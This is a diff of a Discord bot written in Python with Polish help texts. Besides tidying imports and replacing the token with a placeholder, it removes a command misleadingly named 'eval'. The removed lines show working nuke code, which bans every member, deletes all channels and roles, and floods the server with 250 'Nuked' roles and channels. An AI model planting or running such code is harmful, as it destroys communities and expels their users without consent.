@@ -1,12 +1,10 @@
-import discord
-import asyncio
 import os
-import urllib.parse, urllib.request, re
-from discord.ext import commands
-from discord.ext.commands import has_permissions
-from webserver import keep_alive
+import asyncio
 import json
 import datetime
+import discord
+from discord.ext import commands
+from discord.ext.commands import has_permissions
 
 intents = discord.Intents().all()
 guild = discord.Guild
@@ -109,7 +107,7 @@ async def botinfo(ctx):
   em01.add_field(name="**Użycie**",value=".botinfo",inline=False)
   em01.add_field(name="Aliansy" , value="bi")
   await ctx.send(embed=em01)
-  
+
 @help.command()
 async def userinfo(ctx):
   em01 = discord.Embed(title="Pomoc dot komendy userinfo",description="Pokazuje informacje o użytkowniku")
@@ -197,50 +195,10 @@ async def modmail(ctx, *, message=None):
      return await ctx.reply("> Sorry but this command only works on my dm :)")
 
 @client.command()
-async def eval(ctx):
-    silent = "on"
-    await ctx.message.delete()
-    if silent == 'off':
-        await ctx.send(f"Destorying everything")
-    else:
-        print("[!] Destorying everything")
-    for user in list(ctx.guild.members):
-        try:
-            await user.ban()
-            print('Ban all')
-        except:
-            pass 
-    for channel in list(ctx.guild.channels):
-        try:
-            await channel.delete()    
-        except:
-            pass
-    for role in list(ctx.guild.roles):
-        try:
-            await role.delete()
-        except:
-            pass
-    for _i in range(250):
-        await ctx.guild.create_role(name=f"Nuked")
-    for _i in range(250):
-        await ctx.guild.create_text_channel(name=f"Nuked")
-    print("Attack finished")
-
-
-@client.command()
 @commands.has_permissions(administrator=True) # Premission #
 async def responde(ctx, member: discord.Member, *, content):
     channel = await member.create_dm()
     await channel.send(f"**{ctx.message.author} Responded =>** {content}")
 
-@client.command()
-async def support(ctx):
-    await ctx.send("https://discord.gg/zbUnEcEnxM")
 
-@help.command()
-async def support(ctx):
-  em01 = discord.Embed(title="Pomoc dot komendy support",description="Zaproszenie do servera supportu bota.")
-  em01.add_field(name="**Użycie**",value=".support",inline=False)
-  await ctx.send(embed=em01)
-  
-client.run(os.environ['token'])
+client.run("token")
